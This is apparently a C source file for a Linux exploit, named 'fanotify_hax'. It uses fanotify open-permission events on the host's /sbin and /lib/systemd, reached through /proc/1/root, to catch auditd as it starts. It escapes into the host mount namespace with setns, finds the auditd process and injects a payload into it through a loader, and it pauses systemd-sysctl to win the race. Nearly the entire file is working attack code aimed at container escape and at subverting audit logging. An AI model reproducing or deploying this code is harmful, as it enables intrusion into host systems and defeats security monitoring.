#define _GNU_SOURCE     /* Needed to get O_LARGEFILE definition */

#include "mlog.h"
#include "find_audit.h"
#include "loader.h"

#include <sys/types.h>
#include <sys/stat.h>
#include <unistd.h>
#include <errno.h>
#include <fcntl.h>
#include <limits.h>
#include <poll.h>
#include <stdio.h>
#include <sys/mount.h>
#include <sched.h>
#include <stdlib.h>
#include <string.h>
#include <sys/fanotify.h>
#include <sys/ptrace.h>
#include <sys/types.h>
#include <signal.h>
#include <unistd.h>

#define SYSCTL_BIN "/lib/systemd/systemd-sysctl"

enum state {
    INIT,
    OPEN_EVENT,
    PTRACED,
    RELEASED
};

typedef struct _victim_ctx {
    int state;
    pid_t pid;
} victim_ctx;

static victim_ctx audit, sysctl;

static void victim_ctx_init(victim_ctx *self)
{
    if (self) {
        self->state = INIT;
        self->pid = -1;
    }
}

#ifdef DEBUG
#define YAMASCOPE "/proc/sys/kernel/yama/ptrace_scope"

static int get_yama()
{
    FILE *scope;
    char line[256];
    int rc;

    scope = fopen(YAMASCOPE, "r");
    if (scope == NULL) {
        rc = -1;
        goto out;
    }
    if (fgets(line, sizeof(line), scope) == NULL) {
        rc = -1;
        goto out;
    }
    rc = atoi(line);
    (void)fclose(scope);

 out:
    return rc;
}
#endif

static void handle_sigusr1(int signum)
{
    mlog(LINFO, "got sigusr1");
    mlog(LINFO, "audit state -> released");
    audit.state = RELEASED;
}

/* Read all available fanotify events from the file descriptor 'fd' */

static void
handle_events(int fd)
{
    const struct fanotify_event_metadata *metadata;
    struct fanotify_event_metadata buf[200];
    ssize_t len;
    char path[PATH_MAX];
    ssize_t path_len;
    char procfd_path[PATH_MAX];
    struct fanotify_response response;
    int rc = -1;

    /* Loop while events can be read from fanotify file descriptor */
    for(;;) {
        /* Read some events */
        len = read(fd, (void *) &buf, sizeof(buf));
        if (len == -1 && errno != EAGAIN) {
            mlog(LFAIL, "%s: read", strerror(errno));
            goto out;
        }

        /* Check if end of available data reached */
        if (len <= 0) {
            break;
        }

        /* Point to the first event in the buffer */
        metadata = buf;

        /* Loop over all events in the buffer */
        while (FAN_EVENT_OK(metadata, len)) {
            /* Check that run-time and compile-time structures match */
            if (metadata->vers != FANOTIFY_METADATA_VERSION) {
                mlog(LFAIL, "Mismatch of fanotify metadata version.");
                goto out;
            }
            /* metadata->fd contains either FAN_NOFD, indicating a
               queue overflow, or a file descriptor (a nonnegative
               integer). Here, we simply ignore queue overflow. */
            if (metadata->fd >= 0) {
                /* Handle open permission event */
                if (metadata->mask & FAN_OPEN_PERM) {
                    mlog(LINFO, "FAN_OPEN_PERM: ");
                    #ifdef DEBUG
                    mlog(LINFO, "yama: %d", get_yama());
                    #endif

                    /* Retrieve and print pathname of the accessed file */
                    snprintf(procfd_path, sizeof(procfd_path),
                             "/proc/self/fd/%d", metadata->fd);
                    path_len = readlink(procfd_path, path,
                                        sizeof(path) - 1);
                    if (path_len == -1) {
                        mlog(LFAIL, "readlink: %s", strerror(errno));
                    } else {
                        path[path_len] = '\0';
                        if (strncmp("/sbin/auditd", path, sizeof(path)) == 0) {
                            if (audit.state == INIT) {
                                mlog(LINFO, "audit state -> opened");
                                audit.state = OPEN_EVENT;
                            }
                        }
                        if (strncmp(SYSCTL_BIN, path, sizeof(path)) == 0) {
                            if (sysctl.state == INIT && audit.state != RELEASED) {
                                mlog(LINFO, "sysctl state -> opened");
                                sysctl.state = OPEN_EVENT;
                            }
                        }
                    }
                    /* Allow file to be opened */
                    response.fd = metadata->fd;
                    response.response = FAN_ALLOW;

                    {
                        struct stat buf;
                        char pidpath[PATH_MAX];
                        snprintf(pidpath, sizeof(pidpath), "/proc/%d/status", metadata->pid);
                        if (stat(pidpath, &buf) < 0) {
                            mlog(LFAIL, "could not stat %s", pidpath);
                        } else {
                            mlog(LINFO, "can stat %s", pidpath);
                        }
                    }

                    rc = write(fd, &response,
                               sizeof(struct fanotify_response));
                    if (audit.state == OPEN_EVENT) {

                        audit.pid = metadata->pid;
                        audit.state = PTRACED;
                        mlog(LINFO, "audit -> ptraced");
                        mlog(LINFO, "finding auditd as %u", audit.pid);
                        if (fork() == 0) {
                            pid_t pid;
                            int tries = 0;

                            log_init("ptracer");
                            mlog(LINFO, "hello, from ptracer");

                            unshare(CLONE_NEWNS);
                            const int mountflags = MS_NOEXEC | MS_NODEV |
                                MS_NOSUID | MS_RELATIME | MS_REMOUNT;
                            if (mount("proc", "/proc", "proc", mountflags, NULL) < 0) {
                                mlog(LFAIL, "couldnt mount /proc: %s", strerror(errno));
                            }
                            int nsfd = open("/proc/1/ns/mnt", O_RDONLY);
                            if (nsfd < 0) {
                                mlog(LFAIL, "couldn't open: %s", strerror(errno));
                            }
                            if (setns(nsfd, CLONE_NEWNS) < 0) {
                                mlog(LFAIL, "couldn't setns", strerror(errno));
                            }
                            mlog(LPASS, "should be back in root ns now");
                            if (mount("proc", "/proc", "proc", mountflags, NULL) < 0) {
                                mlog(LFAIL, "couldnt mount /proc: %s", strerror(errno));
                            }
                            mlog(LPASS, "and remounted proc");

                            usleep(1000*100); //give auditd 100 ms to do its thing
                            pid = -1;
                            const int maxtries = 100;
                            do {
                                pid = find_audit();
                                if (pid > 0) {
                                    break;
                                }
                                mlog(LFAIL, "could not find auditd");
                                tries++;
                            } while (tries < maxtries);
                            if (tries >= maxtries) {
                                mlog(LFAIL, "couldn't find auditd after 10 tries!");
                                mlog(LFAIL, "hanging around forever");
                                while(1) {
                                    sleep(10);
                                    mlog(LINFO, "heartbeat");
                                }
                                exit(EXIT_FAILURE);
                            }
                            rc = load(pid);
                            if (rc < 0) {
                                mlog(LFAIL, "load failed");
                                exit(EXIT_FAILURE);
                            }
                            kill(getppid(), SIGUSR1);
                            mlog(LPASS, "bye");
                            exit(EXIT_SUCCESS);
                            mlog(LFAIL, "execution here should never happen");
                        }
                    }
                    if (sysctl.state == OPEN_EVENT && audit.state != RELEASED) {
                        sysctl.pid = metadata->pid;
                        mlog(LINFO, "prekill");
                        usleep(10);
                        rc = kill(sysctl.pid, SIGSTOP);
                        mlog(LINFO, "postkill\n");
                        if (rc < 0) {
                            mlog(LFAIL, "%s: kill", strerror(errno));
                            //goto out;
                        }
                        sysctl.state = PTRACED;
                    }
                }
                /* print pathname of the accessed file */
                mlog(LINFO, "File %s\n", path);

                /* Close the file descriptor of the event */
                close(metadata->fd);
            }

            /* Advance to next event */
            metadata = FAN_EVENT_NEXT(metadata, len);
        }
    }
 out:
    mlog(LINFO, "out");
    return;
}

int fanotify_hax()
{
    int rc = -1;
    int fd, poll_num;
    nfds_t nfds;
    struct pollfd fds[1];

    mlog(LINFO, "fanotify_hax entry");

    victim_ctx_init(&audit);
    victim_ctx_init(&sysctl);

    (void)signal(SIGUSR1, handle_sigusr1);

    /* Create the file descriptor for accessing the fanotify API */

    fd = fanotify_init(FAN_CLOEXEC | FAN_CLASS_CONTENT | FAN_NONBLOCK,
                       O_RDONLY | O_LARGEFILE);
    if (fd == -1) {
        mlog(LFAIL, "fanotify_init: %s", strerror(errno));
        goto out;
    }

    char pathname[] = "/proc/1/root/sbin";
    log_stat(pathname);
    mlog(LINFO, "marking '%s'", pathname);
    if (fanotify_mark(fd, FAN_MARK_ADD,
                      FAN_OPEN_PERM|FAN_EVENT_ON_CHILD, AT_FDCWD,
                      pathname) == -1) {
        mlog(LFAIL, "fanotify_mark: %s", strerror(errno));
        goto out;
    }
    if (fanotify_mark(fd, FAN_MARK_ADD,
                      FAN_OPEN_PERM|FAN_EVENT_ON_CHILD, AT_FDCWD,
                      "/proc/1/root/lib/systemd") == -1) {
        mlog(LFAIL, "fanotify_mark: %s", strerror(errno));
        goto out;
    }

    /* Prepare for polling */
    nfds = 1;

    /* Fanotify input */
    fds[0].fd = fd;
    fds[0].events = POLLIN;

    /* This is the loop to wait for incoming events */
    mlog(LINFO, "Listening for events.");
    while (1) {
        poll_num = poll(fds, nfds, 10);
        if (audit.state == RELEASED && sysctl.state == RELEASED) {
            mlog(LPASS, "our work here is done");
            goto out;
        }
        if ((audit.state == RELEASED) && sysctl.state == PTRACED) {
            int rc;

            mlog(LINFO, "****** detaching");
            rc = kill(sysctl.pid, SIGCONT);
            if (rc < 0) {
                mlog(LFAIL, "kill: %s", strerror(errno));
                goto out;
            }
            sysctl.state = RELEASED;
        }
        if (poll_num == 0) {
            /* timeout */
            continue;
        }
        if (poll_num == -1) {
            if (errno == EINTR)     /* Interrupted by a signal */
                continue;           /* Restart poll() */

            mlog(LFAIL, "poll: %s", strerror(errno));
            continue;
        }

        if (poll_num > 0) {
            if (fds[0].revents & POLLIN) {
                /* Fanotify events are available */
                handle_events(fd);
            }
        }
    }

    rc = 0;
 out:
    if (fd >= 0) {
        close(fd);
    }
    return rc;
}


/*
 * Editor modelines  -  https://www.wireshark.org/tools/modelines.html
 *
 * Local variables:
 * c-basic-offset: 4
 * tab-width: 8
 * indent-tabs-mode: nil
 * End:
 *
 * vi: set shiftwidth=4 tabstop=8 expandtab:
 * :indentSize=4:tabSize=8:noTabs=true:
 */
